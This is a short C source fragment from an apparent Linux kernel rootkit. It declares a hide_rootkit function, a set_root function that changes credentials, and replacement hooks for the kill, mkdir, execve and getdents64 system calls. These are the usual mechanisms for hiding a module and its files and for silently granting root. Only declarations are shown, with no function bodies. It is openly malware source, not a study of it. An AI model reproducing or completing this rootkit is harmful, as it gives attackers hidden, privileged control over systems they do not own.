/*
file for the all of the hooked functions and other relevant code
*/
#include <linux/dirent.h>

extern int BUFFER_SIZE;

bool module_hidden = false;
static struct list_head *prev_module; //location of the previous module

static int hide_rootkit(void); //function to unhide\hide the rootkit
static int set_root(void); //changes credentials

//hook functions
static asmlinkage long hooked_kill(const struct pt_regs *regs);
static asmlinkage long hooked_mkdir(const struct pt_regs *regs);
static asmlinkage long hooked_execve(const struct pt_regs *regs);
static asmlinkage long hooked_getdents64(const struct pt_regs *regs);

//the hook_t structs for use within module
struct hook_t sys_kill = {.hooked_syscall = hooked_kill, .syscall_number = __NR_kill};
struct hook_t sys_mkdir = {.hooked_syscall = hooked_mkdir, .syscall_number = __NR_mkdir};
struct hook_t sys_execve = {.hooked_syscall = hooked_execve, .syscall_number = __NR_execve};
struct hook_t sys_getdents64 = {.hooked_syscall = hooked_getdents64, .syscall_number = __NR_getdents64};
